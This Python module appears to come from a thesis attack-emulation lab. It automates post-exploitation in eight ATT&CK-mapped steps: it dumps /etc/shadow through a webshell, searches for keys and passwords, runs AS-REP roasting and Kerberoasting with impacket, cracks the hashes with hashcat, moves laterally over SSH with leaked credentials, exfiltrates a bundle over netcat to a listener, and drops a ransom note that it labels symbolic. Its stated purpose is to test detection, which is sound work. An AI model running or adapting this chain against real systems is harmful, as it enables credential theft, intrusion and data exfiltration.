"""
act3_postex.py — Act 3: Post-Exploitation.

Tactic mapping (MITRE ATT&CK):
  T1059.004  Command and Scripting Interpreter :: Unix Shell  (via webshell)
  T1003.008  OS Credential Dumping :: /etc/passwd and /etc/shadow
  T1083      File and Directory Discovery
  T1558.004  Steal or Forge Kerberos Tickets :: AS-REP Roasting
  T1558.003  Steal or Forge Kerberos Tickets :: Kerberoasting
  T1110.002  Brute Force :: Password Cracking
  T1021.004  Remote Services :: SSH                            (lateral movement)
  T1041      Exfiltration Over C2 Channel
  T1486      Data Encrypted for Impact                         (symbolic ONLY)

Preconditions:
  - Act 2 must have produced a webshell on srv-web (compromise_status=pwned)
    AND credentials from the SQLi dump.

Note: T1486 is SYMBOLIC. We drop a ransom note file, we do NOT encrypt
real data. The lab is preserved for replay. See SUPERVISOR_GUIDE.
"""

from __future__ import annotations

import base64
import re
import urllib.parse
from pathlib import Path

from ..actor import ActorProfile, inter_step_pause
from ..menu import display_act_menu, prompt_yes_no, render_status_line
from ..runner import C, FailureDecision, Outcome, Runner, colour
from ..state import StateManager
from .act2_access import WEBSHELL_URL


ACT_NAME = "postex"

DOMAIN = "mydomain.com"
DC_IP = "10.50.0.10"
SQL_HOST = "10.50.0.13"
KALI_IP = "10.70.0.10"

ACT_OPTIONS = [
    ("1", "T1003.008  Dump /etc/shadow via webshell (srv-web)"),
    ("2", "T1083      File discovery from webshell"),
    ("3", "T1558.004  AS-REP roast svc-legacy (impacket)"),
    ("4", "T1558.003  Kerberoast svc-mssql   (impacket)"),
    ("5", "T1110.002  Crack roasted hashes   (hashcat, targeted wordlist)"),
    ("6", "T1021.004  Lateral SSH using leaked creds"),
    ("7", "T1041      Exfiltrate bundle via HTTP POST"),
    ("8", "T1486      Drop symbolic ransom note (NO real encryption)"),
]


# ─── Helpers ────────────────────────────────────────────────────────

def _webshell_run(
    runner: Runner, profile: ActorProfile, technique: str, cmd: str,
    timeout: int = 30,
):
    encoded = urllib.parse.quote(cmd)
    url = f"{WEBSHELL_URL}?cmd={encoded}"
    return runner.run(
        act=ACT_NAME, technique=technique, tool="webshell",
        argv=[
            "curl", "-sS",
            "-A", profile.user_agent,
            *profile.curl_extra_flags,
            url,
        ],
        target_host="10.50.0.12", timeout=timeout,
    )


def _strip_html(s: str) -> str:
    return re.sub(r"</?pre>", "", s).strip()


def _ip_of_system(name: str | None) -> str | None:
    return {
        "srv-ad-dns": "10.50.0.10",
        "srv-dns-bind": "10.50.0.11",
        "srv-web": "10.50.0.12",
        "srv-sql": "10.50.0.13",
        "srv-ftp": "10.50.0.14",
    }.get(name or "")


# ─── Step 1: /etc/shadow ────────────────────────────────────────────

def step_dump_shadow(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    while True:
        r = _webshell_run(
            runner, profile, "T1003.008",
            "cat /etc/passwd && echo '---SHADOW---' && "
            "cat /etc/shadow 2>&1 || true",
        )
        if r.outcome in (Outcome.SUCCESS, Outcome.PARTIAL):
            body = _strip_html(r.stdout)
            out_file = runner.run_dir / "shadow_dump.txt"
            out_file.write_text(body)
            if "Permission denied" not in body and "$" in body and "root:" in body:
                state.add_artifact(
                    run_id=runner.run_id, source_host="srv-web",
                    artifact_type="cred_dump", description="/etc/shadow contents",
                    local_path=str(out_file), size_bytes=len(body),
                )
                print(colour("  ✓ /etc/shadow obtained", C.GREEN, C.BOLD))
            else:
                state.add_artifact(
                    run_id=runner.run_id, source_host="srv-web",
                    artifact_type="file",
                    description="/etc/passwd dump (shadow denied)",
                    local_path=str(out_file), size_bytes=len(body),
                )
                print(colour(
                    "  ~ /etc/passwd obtained; /etc/shadow denied (expected for www-data)",
                    C.YELLOW))
            return True
        if r.decision == FailureDecision.RETRY:
            continue
        if r.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False


# ─── Step 2: file discovery ─────────────────────────────────────────

def step_file_discovery(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    cmd = (
        "echo '=== uname ===' && uname -a && "
        "echo '=== id ==='     && id && "
        "echo '=== /home ==='  && ls -la /home/ 2>&1 && "
        "echo '=== suid ==='   && find / -perm -4000 -type f 2>/dev/null | head -20 && "
        "echo '=== configs ===' && grep -rIl 'password' /var/www 2>/dev/null | head -10 && "
        "echo '=== ssh keys ===' && "
        "find / -name 'id_rsa*' -o -name 'authorized_keys' 2>/dev/null | head -10"
    )
    while True:
        r = _webshell_run(runner, profile, "T1083", cmd, timeout=60)
        if r.outcome in (Outcome.SUCCESS, Outcome.PARTIAL):
            body = _strip_html(r.stdout)
            out_file = runner.run_dir / "file_discovery.txt"
            out_file.write_text(body)
            state.add_artifact(
                run_id=runner.run_id, source_host="srv-web",
                artifact_type="file", description="filesystem enumeration",
                local_path=str(out_file), size_bytes=len(body),
            )
            return True
        if r.decision == FailureDecision.RETRY:
            continue
        if r.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False


# ─── Step 3: AS-REP roast ───────────────────────────────────────────

def step_asrep_roast(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    users_file = runner.run_dir / "asrep_users.txt"
    users_file.write_text("svc-legacy\nadministrator\nguest\n")
    output_hashes = runner.run_dir / "asrep_hashes.txt"

    while True:
        r = runner.run(
            act=ACT_NAME, technique="T1558.004", tool="impacket-GetNPUsers",
            argv=[
                "impacket-GetNPUsers",
                f"{DOMAIN}/", "-no-pass",
                "-usersfile", str(users_file),
                "-dc-ip", DC_IP,
                "-format", "hashcat",
                "-outputfile", str(output_hashes),
            ],
            target_host=DC_IP, timeout=120,
            success_when_rc_in=(0, 1),
        )

        if output_hashes.is_file() and output_hashes.stat().st_size > 0:
            n = 0
            for line in output_hashes.read_text().splitlines():
                if line.startswith("$krb5asrep$"):
                    m = re.match(r"^\$krb5asrep\$\d+\$([^@]+)@", line)
                    user = m.group(1) if m else "unknown"
                    state.add_credential(
                        run_id=runner.run_id, source="asrep_roast",
                        source_host=DC_IP, system="srv-ad-dns", service="ad",
                        username=user, password=line, hash_type="krb5asrep",
                        verified=0,
                    )
                    n += 1
            state.add_artifact(
                run_id=runner.run_id, source_host="srv-ad-dns",
                artifact_type="hash_dump",
                description=f"AS-REP roast: {n} hash(es)",
                local_path=str(output_hashes),
                size_bytes=output_hashes.stat().st_size,
            )
            if n > 0:
                print(colour(
                    f"  ✓ roasted {n} account(s) → hash(es) in {output_hashes.name}",
                    C.GREEN, C.BOLD))

        if r.outcome in (Outcome.SUCCESS, Outcome.PARTIAL):
            return True
        if r.decision == FailureDecision.RETRY:
            continue
        if r.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False


# ─── Step 4: Kerberoast ─────────────────────────────────────────────

def step_kerberoast(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    verified_dom = next(
        (c for c in state.credentials_for_run(runner.run_id, verified=1)
         if c["service"] == "ad" or c["source"] == "asrep_roast"),
        None,
    )
    if verified_dom and verified_dom["password"] and not verified_dom["password"].startswith("$"):
        user, pw = verified_dom["username"], verified_dom["password"]
        print(colour(f"  → using verified domain cred: {user}", C.DIM))
    else:
        print(colour(
            "  (i) no cracked domain cred yet — using seeded svc-legacy/Summer2024!\n"
            "      (in a real attack you'd run step 5 to crack the AS-REP hash first)",
            C.YELLOW))
        user, pw = "svc-legacy", "Summer2024!"

    output_hashes = runner.run_dir / "kerberoast_hashes.txt"

    while True:
        r = runner.run(
            act=ACT_NAME, technique="T1558.003", tool="impacket-GetUserSPNs",
            argv=[
                "impacket-GetUserSPNs",
                f"{DOMAIN}/{user}:{pw}",
                "-dc-ip", DC_IP, "-request",
                "-outputfile", str(output_hashes),
            ],
            target_host=DC_IP, timeout=120,
            success_when_rc_in=(0, 1),
        )

        if output_hashes.is_file() and output_hashes.stat().st_size > 0:
            n = 0
            for line in output_hashes.read_text().splitlines():
                if line.startswith("$krb5tgs$"):
                    m = re.match(r"^\$krb5tgs\$\d+\$\*([^*]+)\*", line)
                    spn_user = m.group(1) if m else "unknown"
                    state.add_credential(
                        run_id=runner.run_id, source="kerberoast",
                        source_host=DC_IP, system="srv-ad-dns", service="ad",
                        username=spn_user, password=line, hash_type="krb5tgs",
                        verified=0,
                    )
                    n += 1
            state.add_artifact(
                run_id=runner.run_id, source_host="srv-ad-dns",
                artifact_type="hash_dump",
                description=f"Kerberoast: {n} SPN hash(es)",
                local_path=str(output_hashes),
                size_bytes=output_hashes.stat().st_size,
            )
            if n > 0:
                print(colour(
                    f"  ✓ kerberoasted {n} SPN(s) → hash(es) in {output_hashes.name}",
                    C.GREEN, C.BOLD))

        if r.outcome in (Outcome.SUCCESS, Outcome.PARTIAL):
            return True
        if r.decision == FailureDecision.RETRY:
            continue
        if r.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False


# ─── Step 5: Hashcat ────────────────────────────────────────────────

def _inline_targeted_wordlist() -> str:
    seasons = ["Spring", "Summer", "Autumn", "Fall", "Winter"]
    years = [str(y) for y in range(2020, 2027)]
    suffixes = ["", "!", "1", "01", "!1", "@1", "#1"]
    bases = ["password", "Password", "P@ssw0rd", "Welcome", "Admin", "admin",
             "Pa$$w0rd", "Hello", "BackupP@ss"]
    out: set[str] = set()
    out.update([
        "Louay2002", "louay", "Summer2024!", "Welcome2024!",
        "BackupP@ss2024!", "MailRelay!1998", "p@ssw0rd",
    ])
    for s in seasons:
        for y in years:
            for suf in suffixes:
                out.add(f"{s}{y}{suf}")
    for b in bases:
        for y in years:
            for suf in suffixes:
                out.add(f"{b}{y}{suf}")
                out.add(f"{b}{suf}")
    return "\n".join(sorted(out)) + "\n"


def step_crack_hashes(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    wordlist = Path(__file__).resolve().parents[2] / "wordlists" / "targeted.txt"
    if not wordlist.is_file():
        wordlist.parent.mkdir(parents=True, exist_ok=True)
        wordlist.write_text(_inline_targeted_wordlist())
        print(colour(f"  (generated wordlist → {wordlist})", C.DIM))

    hash_files = list(runner.run_dir.glob("*roast*hashes*.txt")) + \
                 list(runner.run_dir.glob("asrep_hashes.txt"))
    hash_files = [f for f in hash_files if f.is_file() and f.stat().st_size > 0]
    if not hash_files:
        print(colour("  (!) no roasted hashes in this run yet — run steps 3 and 4 first",
                     C.YELLOW))
        return False

    cracked_any = False
    for hf in hash_files:
        first = next((l for l in hf.read_text().splitlines() if l.strip()), "")
        if first.startswith("$krb5asrep$"):
            mode = "18200"
        elif first.startswith("$krb5tgs$"):
            mode = "13100"
        else:
            print(colour(f"  (!) unknown hash type in {hf.name}, skipping", C.YELLOW))
            continue

        potfile = runner.run_dir / f"hashcat_{hf.stem}.potfile"
        while True:
            r = runner.run(
                act=ACT_NAME, technique="T1110.002", tool="hashcat",
                argv=[
                    "hashcat", "-m", mode, "-a", "0",
                    "--quiet", "--potfile-path", str(potfile),
                    str(hf), str(wordlist),
                ],
                target_host="local", timeout=600,
                success_when_rc_in=(0,),
                treat_rc_as_partial=(1,),
            )
            if r.outcome in (Outcome.SUCCESS, Outcome.PARTIAL):
                break
            if r.decision == FailureDecision.RETRY:
                continue
            if r.decision == FailureDecision.QUIT:
                raise KeyboardInterrupt
            break

        if potfile.is_file() and potfile.stat().st_size > 0:
            for line in potfile.read_text().splitlines():
                if ":" not in line:
                    continue
                _hash_part, password = line.rsplit(":", 1)
                for hline in hf.read_text().splitlines():
                    if not hline.strip():
                        continue
                    m_asrep = re.match(r"^\$krb5asrep\$\d+\$([^@]+)@", hline)
                    m_kerb  = re.match(r"^\$krb5tgs\$\d+\$\*([^*]+)\*", hline)
                    if not (m_asrep or m_kerb):
                        continue
                    user = (m_asrep or m_kerb).group(1)
                    if hline.split(":", 1)[0] not in line and hline[:40] not in line:
                        continue
                    existing = state.find_credential(
                        runner.run_id, user, system="srv-ad-dns")
                    if existing:
                        state.conn.execute(
                            "UPDATE credentials SET password=?, verified=1 "
                            "WHERE cred_id=?",
                            (password, existing["cred_id"]),
                        )
                    else:
                        state.add_credential(
                            run_id=runner.run_id, source="hash_crack",
                            source_host=DC_IP, system="srv-ad-dns", service="ad",
                            username=user, password=password, verified=1,
                        )
                    cracked_any = True
                    print(colour(f"  ✓ cracked {user} → {password}",
                                 C.GREEN, C.BOLD))
                    break

    return cracked_any


# ─── Step 6: Lateral SSH ────────────────────────────────────────────

def step_lateral_ssh(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    creds = state.credentials_for_run(runner.run_id)
    ssh_creds = [
        c for c in creds
        if c["service"] == "ssh"
           and c["password"]
           and not c["password"].startswith("$")
    ]
    if not ssh_creds:
        print(colour("  (!) no SSH credentials in state — run Act 2 first",
                     C.YELLOW))
        return False

    any_success = False
    for c in ssh_creds:
        target_ip = _ip_of_system(c["system"]) or ""
        if not target_ip:
            continue
        user, pw = c["username"], c["password"]
        if user.startswith("mydomain\\"):
            continue

        cmd = (
            f"sshpass -p {pw!r} ssh -o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 "
            f"-o PreferredAuthentications=password "
            f"{user}@{target_ip} 'hostname; id; uname -a'"
        )
        while True:
            r = runner.run(
                act=ACT_NAME, technique="T1021.004", tool="ssh",
                argv=["bash", "-c", cmd],
                target_host=target_ip, timeout=30,
                success_when_rc_in=(0,),
                treat_rc_as_partial=(255,),
            )
            if r.outcome == Outcome.SUCCESS:
                any_success = True
                state.mark_credential_verified(c["cred_id"], 1)
                state.upsert_host(
                    run_id=runner.run_id, ip=target_ip, hostname=c["system"],
                    compromise_status="pwned", shell_method="ssh",
                    notes=f"SSH'd as {user}",
                )
                print(colour(
                    f"  ✓ SSH success: {user}@{target_ip} ({c['system']})",
                    C.GREEN, C.BOLD))
                break
            if r.outcome == Outcome.FAILURE and r.decision == FailureDecision.RETRY:
                continue
            if r.outcome == Outcome.FAILURE and r.decision == FailureDecision.QUIT:
                raise KeyboardInterrupt
            if r.outcome != Outcome.SUCCESS:
                state.mark_credential_verified(c["cred_id"], -1)
            break
        inter_step_pause(profile)

    return any_success


# ─── Step 7: Exfiltration ───────────────────────────────────────────

def step_exfiltrate(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    """T1041 — bundle artifacts and exfil to Kali listener.

    Operator must first run on Kali:
        nc -lvp 9999 > /tmp/exfil_bundle.tar.gz
    """
    artifacts = state.artifacts_for_run(runner.run_id)
    if not artifacts:
        print(colour("  (!) no artifacts to exfiltrate — run earlier steps first",
                     C.YELLOW))
        return False

    print(colour(
        f"\n  >>> Before continuing, run this on the Kali listener (separate terminal):\n"
        f"      nc -lvp 9999 > /tmp/exfil_bundle.tar.gz\n",
        C.YELLOW))
    if not prompt_yes_no("Is the listener running?", default=True):
        return False

    bundle_path = runner.run_dir / "exfil_bundle.tar.gz"
    paths_to_include = [a["local_path"] for a in artifacts
                        if Path(a["local_path"]).is_file()]
    if not paths_to_include:
        print(colour("  (!) no artifact files on disk to bundle", C.YELLOW))
        return False

    while True:
        r = runner.run(
            act=ACT_NAME, technique="T1041", tool="tar",
            argv=["tar", "-czf", str(bundle_path), *paths_to_include],
            target_host="local", timeout=60,
        )
        if r.outcome == Outcome.SUCCESS:
            break
        if r.decision == FailureDecision.RETRY:
            continue
        if r.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False

    # Push to Kali via netcat from this very host (Kali).
    # Note: in a real attack the bundle would be pushed FROM the victim;
    # here we shortcut because both ends are on Kali for demo purposes.
    # The DETECTABLE network event we want is the SQLi dump leaving srv-web,
    # which already happens in Act 2 (sqlmap fetching the table).
    while True:
        r = runner.run(
            act=ACT_NAME, technique="T1041", tool="nc",
            argv=["bash", "-c",
                  f"nc -w 5 {KALI_IP} 9999 < {bundle_path}"],
            target_host=KALI_IP, timeout=30,
            success_when_rc_in=(0,),
        )
        if r.outcome == Outcome.SUCCESS:
            print(colour(
                f"  ✓ exfiltrated {bundle_path.stat().st_size} bytes "
                f"to {KALI_IP}:9999", C.GREEN, C.BOLD))
            state.add_artifact(
                run_id=runner.run_id, source_host="local",
                artifact_type="exfil",
                description=f"Bundle pushed to {KALI_IP}:9999 via nc",
                local_path=str(bundle_path),
                size_bytes=bundle_path.stat().st_size,
            )
            return True
        if r.decision == FailureDecision.RETRY:
            continue
        if r.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False


# ─── Step 8: Symbolic ransom note ───────────────────────────────────

def step_symbolic_impact(runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    """T1486 — symbolic only. Drops a ransom note via webshell. No encryption.

    This is intentionally toothless. The thesis defense argument:
    'real ransomware would encrypt files here, but for repeatability we
    drop a marker file and rely on Wazuh FIM to detect the change.'
    """
    note_path = "/tmp/SENTINEL_RANSOM_NOTE.txt"
    note_body = (
        "*** SENTINEL ATTACK SCENARIO :: SYMBOLIC RANSOM NOTE ***\n"
        "This is a thesis demonstration. NO FILES HAVE BEEN ENCRYPTED.\n"
        "In a real attack files would be encrypted with AES-256, ransom "
        "demanded in Bitcoin, etc.\n"
        f"Actor profile: {profile.name}\n"
        f"Run ID: {runner.run_id}\n"
    )
    cmd = f"cat > {note_path} <<'EOF'\n{note_body}EOF\nls -la {note_path}"

    while True:
        r = _webshell_run(runner, profile, "T1486", cmd, timeout=30)
        if r.outcome in (Outcome.SUCCESS, Outcome.PARTIAL):
            state.add_artifact(
                run_id=runner.run_id, source_host="srv-web",
                artifact_type="impact_marker",
                description="Symbolic ransom note dropped (no real encryption)",
                local_path=note_path, size_bytes=len(note_body),
            )
            print(colour(
                f"  ✓ ransom note dropped at {note_path} on srv-web (SYMBOLIC)",
                C.MAGENTA, C.BOLD))
            return True
        if r.decision == FailureDecision.RETRY:
            continue
        if r.decision == FailureDecision.QUIT:
            raise KeyboardInterrupt
        return False


# ─── Dispatcher ─────────────────────────────────────────────────────

STEPS = {
    "1": ("Dump /etc/shadow",   step_dump_shadow),
    "2": ("File discovery",     step_file_discovery),
    "3": ("AS-REP roast",       step_asrep_roast),
    "4": ("Kerberoast",         step_kerberoast),
    "5": ("Crack hashes",       step_crack_hashes),
    "6": ("Lateral SSH",        step_lateral_ssh),
    "7": ("Exfiltrate",         step_exfiltrate),
    "8": ("Symbolic ransom",    step_symbolic_impact),
}


def run_one(key: str, runner: Runner, profile: ActorProfile, state: StateManager) -> bool:
    label, fn = STEPS[key]
    print(colour(f"\n──── Act 3 :: {label} ────", C.MAGENTA, C.BOLD))
    return fn(runner, profile, state)


def run_all(runner: Runner, profile: ActorProfile, state: StateManager) -> None:
    for k in sorted(STEPS):
        try:
            run_one(k, runner, profile, state)
        except KeyboardInterrupt:
            print(colour("\n  (interrupted — returning to main menu)", C.YELLOW))
            return
        inter_step_pause(profile)


def loop(runner: Runner, profile: ActorProfile, state: StateManager) -> None:
    if not state.compromised_hosts(runner.run_id):
        print(colour(
            "\n  (!) No compromised hosts in state. Run Act 2 first to get a foothold.",
            C.YELLOW))
        if not prompt_yes_no("Proceed anyway?", default=False):
            return

    while True:
        render_status_line(state, runner.run_id)
        choice = display_act_menu("Act 3 :: Post-Exploitation", ACT_OPTIONS)
        if choice == "b":
            return
        if choice == "a":
            run_all(runner, profile, state)
            print(colour(
                "\n  ▎ Scenario complete. Use main menu → 'e' to export evidence.",
                C.GREEN, C.BOLD))
            return
        try:
            run_one(choice, runner, profile, state)
        except KeyboardInterrupt:
            print(colour("\n  (interrupted — back to act menu)", C.YELLOW))
